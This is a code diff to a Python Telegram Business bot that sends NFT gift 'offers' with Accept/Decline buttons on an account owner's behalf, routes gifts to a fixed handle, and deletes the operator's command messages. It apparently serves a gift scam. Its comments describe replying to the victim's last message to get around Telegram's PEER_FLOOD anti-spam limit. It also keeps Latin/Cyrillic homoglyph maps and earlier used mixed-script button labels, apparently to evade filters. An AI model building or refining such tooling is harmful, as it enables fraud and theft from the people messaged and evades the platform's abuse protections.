@@ -28,16 +28,18 @@ GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
 RECIPIENT = "@tradiqx"
 LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}
 
-# ---- Premium emoji IDs (все 7) ----
-E_GEM   = "5318901904686754959"   # 💎 алмаз / GRAM
-E_WARN  = "6030563507299160824"   # ⚠ восклицание
-E_OK    = "5774022692642492953"   # ✅ галочка (кнопка «Пpинять»)
-E_NO    = "5774077015388852135"   # ❌ крестик (кнопка «Oтклoнить»)
-E_TIMER = "6037268453759389862"   # ⏱ часы
-E_GIFT  = "5773677501825945508"   # 🎁 подарок
-E_STAR  = "6028338546736107668"   # ⭐ звезда
-E_CHECK = "5774022692642492953"   # ✅ галочка (финал)
-E_LOCK  = "5774077015388852135"   # 🔒 замок (используем крестик как «защита»)
+E_GEM   = "5318901904686754959"
+E_WARN  = "6030563507299160824"
+E_OK    = "5774022692642492953"
+E_NO    = "5774077015388852135"
+E_TIMER = "6037268453759389862"
+E_GIFT  = "5773677501825945508"
+E_STAR  = "6028338546736107668"
+E_CHECK = "5774022692642492953"
+E_LOCK  = "5774077015388852135"
+
+# кеш: chat_id → последний message_id от юзера
+_last_user_msg: dict[int, int] = {}
 
 
 def em(eid: str, fallback: str) -> str:
@@ -45,16 +47,9 @@ def em(eid: str, fallback: str) -> str:
 
 
 LAT_TO_CYR = {
-    "A": "А",
-    "a": "а",
-    "C": "С",
-    "c": "с",
-    "E": "Е",
-    "e": "е",
-    "O": "О",
-    "o": "о",
-    "X": "Х",
-    "x": "х",
+    "A": "А", "a": "а", "C": "С", "c": "с",
+    "E": "Е", "e": "е", "O": "О", "o": "о",
+    "X": "Х", "x": "х",
 }
 CYR_TO_LAT = {v: k for k, v in LAT_TO_CYR.items()}
 
@@ -352,7 +347,10 @@ async def handle_business_message(message: Message):
     bcid = message.business_connection_id
     if not bcid:
         return
+
+    # сообщение от юзера — кешируем message_id и выходим
     if not _business_offer_from_owner(message):
+        _last_user_msg[message.chat.id] = message.message_id
         return
 
     parsed = parse_command(message.text or "")
@@ -364,33 +362,9 @@ async def handle_business_message(message: Message):
     if not gift:
         return
     gift_name, gift_num = gift
-    preview_url = _gift_preview_url(gift_name, gift_num)
 
-    # ищем последнее сообщение пользователя — reply на него обходит PEER_FLOOD
-    reply_to = None
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getBusinessConnection"
-        async with aiohttp.ClientSession() as s:
-            async with s.get(url, params={"business_connection_id": bcid}) as r:
-                conn = await r.json()
-        user_id = conn.get("result", {}).get("user", {}).get("id")
-        if user_id:
-            url2 = f"https://api.telegram.org/bot{BOT_TOKEN}/getMessages"
-            async with aiohttp.ClientSession() as s:
-                async with s.post(url2, data={
-                    "business_connection_id": bcid,
-                    "chat_id": message.chat.id,
-                    "limit": 10,
-                }) as r:
-                    msgs = await r.json()
-            for m in reversed(msgs.get("result", {}).get("messages", [])):
-                if m.get("from", {}).get("id") == message.chat.id:
-                    reply_to = m["message_id"]
-                    break
-    except Exception as e:
-        logging.warning(f"get history error: {e}")
+    reply_to = _last_user_msg.get(message.chat.id)
 
-    # сначала шлём оффер — если упал, команду не удаляем
     try:
         send_kwargs = dict(
             chat_id=message.chat.id,
@@ -406,7 +380,6 @@ async def handle_business_message(message: Message):
         logging.error(f"send error: {e}")
         return
 
-    # send прошёл — удаляем команду оператора
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteBusinessMessages"
         payload = {
@@ -458,9 +431,10 @@ async def accept(cb: CallbackQuery):
 
 @dp.callback_query(F.data == "decline")
 async def decline(cb: CallbackQuery):
+    lang = "ru"
     try:
         await cb.message.edit_text(
-            text=f'{em(E_NO, "❌")} {T("ru", "declined")}',
+            text=f'{em(E_NO, "❌")} {T(lang, "declined")}',
             reply_markup=None,
         )
     except Exception as e:
@@ -490,4 +464,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-    
